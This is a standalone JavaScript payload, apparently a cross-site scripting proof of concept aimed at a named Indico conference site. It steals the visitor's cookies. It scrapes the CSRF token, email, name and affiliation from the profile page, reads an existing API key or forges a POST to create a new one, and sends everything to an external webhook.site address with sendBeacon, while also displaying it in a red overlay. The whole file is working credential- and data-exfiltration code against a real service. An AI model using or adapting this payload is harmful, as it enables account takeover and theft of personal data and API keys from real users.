(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;
  var evidence = { cookies: cookies };

  fetch('https://indico.iter.org/user/profile/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      evidence.csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
      evidence.email = g(/name="email"[^>]*value="([^"]+)"/)
        || g(/"email":\s*"([^"]+)"/)
        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
      evidence.first_name = g(/name="first_name"[^>]*value="([^"]+)"/)
        || g(/"first_name":\s*"([^"]+)"/);
      evidence.last_name = g(/name="last_name"[^>]*value="([^"]+)"/)
        || g(/"last_name":\s*"([^"]+)"/);
      evidence.affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
        || g(/"affiliation":\s*"([^"]+)"/);

      if (!evidence.csrf) {
        evidence.step = 'profile_failed';
        evidence.html_chunk = html.substring(0, 4000);
        report(evidence);
        return;
      }

      evidence.step = 'profile_read';
      report(evidence);

      return fetch('https://indico.iter.org/user/api/', { credentials: 'include' })
        .then(function (r) { return r.text(); })
        .then(function (apiHtml) {
          var g2 = function (re) { var m = apiHtml.match(re); return m ? m[1] : null; };

          var existingKey = g2(/API Key[^<]*<[^>]*>[^<]*<code[^>]*>([A-Za-z0-9_-]+)<\/code>/)
            || g2(/<code[^>]*class="[^"]*api-key[^"]*"[^>]*>([^<]+)<\/code>/)
            || g2(/apikey['":\s]+['"]([A-Za-z0-9_-]{20,})/)
            || g2(/<td[^>]*>\s*([a-f0-9]{40})\s*<\/td>/)
            || g2(/<code>([a-f0-9]{40})<\/code>/);

          if (existingKey) {
            evidence.step = 'api_key_stolen';
            evidence.api_key = existingKey;
            evidence.api_page_snippet = apiHtml.substring(0, 3000);
            report(evidence);
            return;
          }

          var apiCsrf = g2(/name="csrf_token"[^>]*value="([^"]+)"/)
            || g2(/name="csrf-token"[^>]*content="([^"]+)"/);

          if (!apiCsrf) apiCsrf = evidence.csrf;

          var hasCreateBtn = /key_create|Create API key/i.test(apiHtml);

          evidence.api_key_exists = false;
          evidence.has_create_button = hasCreateBtn;
          evidence.api_page_snippet = apiHtml.substring(0, 3000);

          if (hasCreateBtn) {
            return fetch('https://indico.iter.org/user/api/key', {
              method: 'POST',
              credentials: 'include',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: 'csrf_token=' + encodeURIComponent(apiCsrf)
            })
              .then(function (r) { return r.text(); })
              .then(function (createHtml) {
                var g3 = function (re) { var m = createHtml.match(re); return m ? m[1] : null; };
                var newKey = g3(/<code>([a-f0-9]{40})<\/code>/)
                  || g3(/<code[^>]*>([A-Za-z0-9_-]{20,})<\/code>/)
                  || g3(/([a-f0-9]{40})/);

                evidence.step = 'api_key_created';
                evidence.api_key = newKey;
                evidence.create_status = 'attempted';
                evidence.create_snippet = createHtml.substring(0, 3000);
                report(evidence);
              });
          } else {
            evidence.step = 'api_page_read';
            report(evidence);
          }
        });
    })
    .catch(function (err) {
      evidence.step = 'error';
      evidence.error = err.message;
      report(evidence);
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'Step: ' + (ev.step || '?') + '\n'
      + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
      + 'Email: ' + (ev.email || 'n/a') + '\n'
      + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
      + 'Affiliation: ' + (ev.affiliation || 'n/a') + '\n'
      + 'API Key: ' + (ev.api_key || 'n/a') + '\n'
      + 'Cookies: ' + (ev.cookies || 'n/a');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
